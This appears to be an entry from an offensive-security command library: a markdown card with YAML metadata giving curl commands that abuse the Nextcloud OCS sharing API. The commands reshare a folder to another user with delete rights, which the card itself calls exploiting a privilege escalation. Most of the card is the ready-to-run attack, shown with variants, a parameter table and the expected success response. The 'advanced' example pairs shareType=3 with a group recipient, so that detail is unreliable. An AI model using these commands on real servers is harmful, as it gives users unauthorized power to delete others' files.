---
data: >-
  curl --user user1:user1
  "http://172.17.0.1:8081/ocs/v1.php/apps/files_sharing/api/v1/shares" -H
  "OCS-APIRequest: true" -X POST --data
  'path=/test&shareType=0&shareWith=user2&permissions=25'
tags:
  - nextcloud
  - api
  - sharing
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.903Z'
id: 519361bd-b4c3-4ea1-a70e-af44b5f5e3a7
verified: false
validated: true
submitted: true
---
# nextcloud-reshare-with-delete-permission

## Command

```bash
curl --user user1:user1 "http://172.17.0.1:8081/ocs/v1.php/apps/files_sharing/api/v1/shares" -H "OCS-APIRequest: true" -X POST --data 'path=/test&shareType=0&shareWith=user2&permissions=25'
```

## Description

This command reshares a folder in Nextcloud via the OCS sharing API, adding unauthorized delete permissions to exploit a privilege escalation vulnerability. It uses basic auth for User1 and posts parameters to create a share to User2 with elevated permissions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--user` | Basic auth credentials (username:password) | Yes |
| URL | Sharing API endpoint | Yes |
| `-H` | OCS-APIRequest header for API format | Yes |
| `-X POST` | HTTP method for creating share | Yes |
| `--data` | POST data: path (folder), shareType=0 (user), shareWith (recipient), permissions=25 (read+reshare+delete) | Yes |

## Examples

### Basic Usage

```bash
curl --user user1:user1 "http://nextcloud.example.com/ocs/v1.php/apps/files_sharing/api/v1/shares" -H "OCS-APIRequest: true" -X POST --data 'path=/test&shareType=0&shareWith=user2&permissions=25'
```

### Advanced Usage

Adapt host and users; add silent flag for scripting: `-s`.

```bash
curl -s --user user1:user1 "http://172.17.0.1:8081/ocs/v1.php/apps/files_sharing/api/v1/shares" -H "OCS-APIRequest: true" -X POST --data 'path=/test&shareType=3&shareWith=group2&permissions=25'
```

## Expected Output

XML response from OCS API: <ocs><meta><statuscode>100</statuscode><status>ok</status></meta><data><id>123</id></data></ocs> indicating successful share creation.

## Related

- [[Related Procedure: Nextcloud-Reshare-with-Elevated-Delete-Permission]]
